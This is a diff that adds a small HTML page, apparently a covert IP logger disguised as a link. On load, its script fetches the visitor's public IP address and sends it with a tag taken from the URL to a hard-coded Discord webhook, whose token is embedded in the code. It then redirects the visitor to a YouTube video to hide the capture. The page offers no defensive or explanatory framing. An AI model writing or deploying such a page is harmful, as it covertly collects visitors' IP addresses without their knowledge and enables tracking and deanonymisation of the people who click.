@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+</head>
+<body>
+    <script>
+        var queryDict = {}
+        location.search.substr(1).split("&").forEach(function(item) {queryDict[item.split("=")[0]] = item.split("=")[1]})
+
+        const Webhook = "https://discord.com/api/webhooks/1175913156011364433/4-1rlftpIub6_DGZhiKlRpWHdBiN6fsKh9yO4Adskg46DB6_H7y97yJedVzj47QdMaf3"
+
+        fetch("https://api64.ipify.org/?format=text").then((Response) => {
+            Response.text().then((Ip) => {
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", Webhook, true);
+                xhr.setRequestHeader('Content-Type', 'application/json');
+                xhr.send(JSON.stringify({
+                    'content': "Users Ip: " + Ip,
+                    'username':queryDict["a"],
+                }));
+                location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
+            })
+        })
+    </script>
+</body>
+</html>
